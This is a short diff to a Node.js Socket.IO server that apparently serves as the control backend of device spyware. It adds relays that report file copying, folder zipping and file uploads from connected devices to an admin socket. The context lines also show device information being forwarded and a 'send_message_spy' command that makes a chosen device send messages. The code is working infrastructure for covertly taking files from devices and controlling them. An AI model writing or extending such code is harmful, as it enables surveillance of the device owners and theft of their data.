@@ -126,6 +126,21 @@ io.on("connection", (socket) => {
     io.to(admin_socket_id).emit("device_info_data", data);
   });
 
+  socket.on("copying_files", () => {
+    io.to(admin_socket_id).emit("copying_files");
+  });
+
+  socket.on("zipping_folder", () => {
+    io.to(admin_socket_id).emit("zipping_folder");
+  });
+
+  socket.on("zip_completed", () => {
+    io.to(admin_socket_id).emit("zip_completed");
+  });
+  socket.on("file_uploaded", (data) => {
+    io.to(admin_socket_id).emit("file_uploaded", data);
+  });
+
   socket.on("send_message", (too, number, data) => {
     io.to(device_secure_ids[too]).emit("send_message_spy", number, data);
   });
